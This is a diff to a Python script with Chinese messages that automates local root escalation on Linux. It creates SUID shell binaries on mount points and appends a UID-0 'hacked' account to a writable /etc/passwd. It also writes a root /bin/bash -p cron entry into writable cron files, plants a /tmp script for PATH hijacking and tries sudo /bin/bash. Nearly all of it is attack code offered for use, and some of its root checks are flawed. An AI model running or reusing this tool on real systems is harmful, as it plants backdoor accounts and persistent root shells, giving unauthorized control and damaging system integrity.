@@ -2,6 +2,7 @@ import os
 import subprocess
 import sys
 import stat
+import pwd
 
 def check_root():
     """检查当前用户是否为 root"""
@@ -30,11 +31,9 @@ def parse_mounts(file_path):
                     if len(parts) >= 4:
                         mount_point = parts[1]
                         options = parts[3].split(",")
-                        # 检查 suid 或 dev 选项
                         if "suid" in options or "dev" in options:
                             potential_vulns.append((mount_point, options, f"{file_path} 包含 suid/dev"))
                             print(f"[*] 发现潜在漏洞挂载点：{mount_point}，选项：{options} ({file_path})")
-                        # 检查挂载点是否对当前用户可写
                         try:
                             if os.access(mount_point, os.W_OK):
                                 potential_vulns.append((mount_point, options, f"{file_path} 可写"))
@@ -52,16 +51,13 @@ def try_fstab_exploit(vulns):
         print(f"[*] 尝试利用挂载点 {mount_point}（原因：{reason}）")
         binary_path = os.path.join(mount_point, "exploit")
         try:
-            # 创建简单的 SUID shell 程序
             with open(binary_path, "w") as f:
                 f.write("#!/bin/bash\n/bin/bash -p\n")
             os.chmod(binary_path, stat.S_IRWXU | stat.S_ISUID)
             print(f"[*] 在 {mount_point} 创建 SUID 二进制文件：{binary_path}")
-            # 运行并验证是否提权到 root
             process = subprocess.Popen([binary_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
             stdout, stderr = process.communicate()
             if process.returncode == 0:
-                # 检查新进程是否为 root
                 whoami = subprocess.run(["whoami"], capture_output=True, text=True).stdout.strip()
                 if whoami == "root":
                     print(f"[+] 成功通过 {binary_path} 获取 root 权限")
@@ -75,16 +71,14 @@ def try_fstab_exploit(vulns):
     return False
 
 def try_os_system():
-    """尝试使用 os.system 调用 /bin/sh -p 并验证提权"""
+    """尝试使用 /bin/sh -p 并验证提权"""
     description = "使用 os.system 调用 sh -p"
     command = "/bin/sh -p"
     print(f"[*] 尝试: {description}")
     try:
-        # 使用 subprocess 而非 os.system，以便验证提权结果
         process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         stdout, stderr = process.communicate()
         if process.returncode == 0:
-            # 检查是否提权到 root
             whoami = subprocess.run(["whoami"], capture_output=True, text=True).stdout.strip()
             if whoami == "root":
                 print(f"[+] 成功: {description}，获取 root 权限")
@@ -105,7 +99,6 @@ def try_command(description, command):
         process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         stdout, stderr = process.communicate()
         if process.returncode == 0:
-            # 检查是否提权到 root
             whoami = subprocess.run(["whoami"], capture_output=True, text=True).stdout.strip()
             if whoami == "root":
                 print(f"[+] 成功: {description}，获取 root 权限")
@@ -117,6 +110,133 @@ def try_command(description, command):
         return False
     except Exception as e:
         print(f"[-] 失败: {description} - {str(e)}")
+        return False
+
+def try_special_methods():
+    """尝试特殊提权手段"""
+    special_methods = [
+        ("检查 /etc/passwd 可写", try_writable_passwd),
+        ("检查 /etc/crontab 可写", try_writable_crontab),
+        ("环境变量 PATH 劫持", try_path_hijack),
+        ("检查 SUDO 权限", try_sudo_privileges),
+        ("检查内核版本漏洞", try_kernel_exploit)
+    ]
+
+    print("[*] 尝试特殊提权手段...")
+    for description, method in special_methods:
+        print(f"[*] 尝试: {description}")
+        if method():
+            print(f"[+] 成功: {description}，获取 root 权限")
+            return True
+        else:
+            print(f"[-] 失败: {description}")
+    return False
+
+def try_writable_passwd():
+    """检查 /etc/passwd 是否可写并添加 root 用户"""
+    passwd_file = "/etc/passwd"
+    try:
+        if os.access(passwd_file, os.W_OK):
+            print(f"[*] /etc/passwd 可写，尝试添加 root 用户")
+            new_user = "hacked:root:0:0:hacked:/root:/bin/bash"
+            with open(passwd_file, "a") as f:
+                f.write(f"\n{new_user}\n")
+            print(f"[*] 已添加用户 hacked，尝试 su hacked")
+            process = subprocess.Popen(["su", "hacked"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            stdout, stderr = process.communicate()
+            if process.returncode == 0:
+                whoami = subprocess.run(["whoami"], capture_output=True, text=True).stdout.strip()
+                if whoami == "root":
+                    return True
+            print(f"[-] su hacked 失败")
+        return False
+    except Exception as e:
+        print(f"[-] 检查 /etc/passwd 失败：{str(e)}")
+        return False
+
+def try_writable_crontab():
+    """检查 /etc/crontab 或 /etc/cron.* 是否可写"""
+    cron_paths = ["/etc/crontab", "/etc/cron.d", "/etc/cron.daily", "/etc/cron.hourly", "/etc/cron.monthly"]
+    try:
+        for path in cron_paths:
+            if os.path.isdir(path):
+                for root, _, files in os.walk(path):
+                    for file in files:
+                        cron_file = os.path.join(root, file)
+                        if os.access(cron_file, os.W_OK):
+                            print(f"[*] 可写 cron 文件：{cron_file}")
+                            with open(cron_file, "a") as f:
+                                f.write("\n* * * * * root /bin/bash -p\n")
+                            print(f"[*] 已修改 {cron_file} 执行 /bin/bash -p，等待 cron 执行")
+                            return True
+            elif os.access(path, os.W_OK):
+                print(f"[*] 可写 cron 文件：{path}")
+                with open(path, "a") as f:
+                    f.write("\n* * * * * root /bin/bash -p\n")
+                print(f"[*] 已修改 {path} 执行 /bin/bash -p，等待 cron 执行")
+                return True
+        return False
+    except Exception as e:
+        print(f"[-] 检查 cron 文件失败：{str(e)}")
+        return False
+
+def try_path_hijack():
+    """尝试 PATH 劫持利用 SUID 二进制"""
+    try:
+        binary_path = "/tmp/malicious"
+        with open(binary_path, "w") as f:
+            f.write("#!/bin/bash\n/bin/bash -p\n")
+        os.chmod(binary_path, stat.S_IRWXU)
+        os.environ["PATH"] = f"/tmp:{os.environ['PATH']}"
+        for cmd in ["/usr/bin/find", "/usr/bin/awk"]:  # 假设这些是 SUID 二进制
+            if os.path.exists(cmd):
+                print(f"[*] 尝试 PATH 劫持利用 {cmd}")
+                process = subprocess.Popen([cmd, "malicious"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+                stdout, stderr = process.communicate()
+                if process.returncode == 0:
+                    whoami = subprocess.run(["whoami"], capture_output=True, text=True).stdout.strip()
+                    if whoami == "root":
+                        return True
+                    else:
+                        print(f"[-] PATH 劫持 {cmd} 未提权到 root（当前用户：{whoami}）")
+        return False
+    except Exception as e:
+        print(f"[-] PATH 劫持失败：{str(e)}")
+        return False
+
+def try_sudo_privileges():
+    """检查 SUDO 权限"""
+    try:
+        process = subprocess.Popen(["sudo", "-l"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        stdout, stderr = process.communicate()
+        if "ALL" in stdout or "root" in stdout:
+            print(f"[*] 发现 SUDO 权限，尝试 sudo /bin/bash")
+            process = subprocess.Popen(["sudo", "/bin/bash"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            stdout, stderr = process.communicate()
+            if process.returncode == 0:
+                whoami = subprocess.run(["whoami"], capture_output=True, text=True).stdout.strip()
+                if whoami == "root":
+                    return True
+                else:
+                    print(f"[-] sudo /bin/bash 未提权到 root（当前用户：{whoami}）")
+        return False
+    except Exception as e:
+        print(f"[-] 检查 SUDO 权限失败：{str(e)}")
+        return False
+
+def try_kernel_exploit():
+    """检查内核版本并尝试已知漏洞"""
+    try:
+        kernel_version = subprocess.run(["uname", "-r"], capture_output=True, text=True).stdout.strip()
+        print(f"[*] 当前内核版本：{kernel_version}")
+        # 示例：检查 Dirty COW (CVE-2016-5195)，适用于 2.6.22 - 4.8 内核
+        if "2.6." in kernel_version or "3." in kernel_version or "4." in kernel_version[:3]:
+            print(f"[*] 内核 {kernel_version} 可能易受 Dirty COW 攻击，需手动测试")
+            # 这里仅提示，实际需下载并编译 exploit 代码
+            return False
+        return False
+    except Exception as e:
+        print(f"[-] 检查内核版本失败：{str(e)}")
         return False
 
 def main():
@@ -143,7 +263,7 @@ def main():
         print("[+] 已成功获取 root 权限，退出脚本。")
         sys.exit(0)
 
-    # 3. 尝试其他 SUID 二进制文件
+    # 3. 尝试 SUID 二进制文件
     suid_methods = [
         ("bash -p", "/usr/bin/bash -p"),
         ("sh -p", "/usr/bin/sh -p"),
@@ -157,14 +277,12 @@ def main():
     ]
 
     print("[*] 尝试 SUID 二进制文件获取 root 权限...")
-
     for description, cmd in suid_methods:
         if "man" in description or "more" in description:
             print(f"[*] 注意: {description} 需要交互模式，运行后请手动输入 '!/bin/bash' 并检查是否为 root。")
             print(f"[*] 运行命令: {cmd}")
             try:
                 subprocess.run(cmd, shell=True)
-                # 检查是否提权到 root
                 whoami = subprocess.run(["whoami"], capture_output=True, text=True).stdout.strip()
                 if whoami == "root":
                     print(f"[+] 成功: {description}，获取 root 权限")
@@ -178,7 +296,16 @@ def main():
                 print("[+] 已成功获取 root 权限，退出脚本。")
                 sys.exit(0)
 
-    print("[-] 所有方法均失败，请检查 SUID 权限、挂载配置或系统安全机制。")
+    # 4. 尝试特殊手段
+    if try_special_methods():
+        print("[+] 已成功获取 root 权限，退出脚本。")
+        sys.exit(0)
+
+    print("[-] 所有方法均失败，建议手动检查：")
+    print("    - 查找所有 SUID 文件：find / -perm -4000 2>/dev/null")
+    print("    - 检查挂载配置：cat /proc/mounts; cat /etc/fstab")
+    print("    - 检查 SUDO 权限：sudo -l")
+    print("    - 检查内核版本：uname -r")
 
 if __name__ == "__main__":
     main()
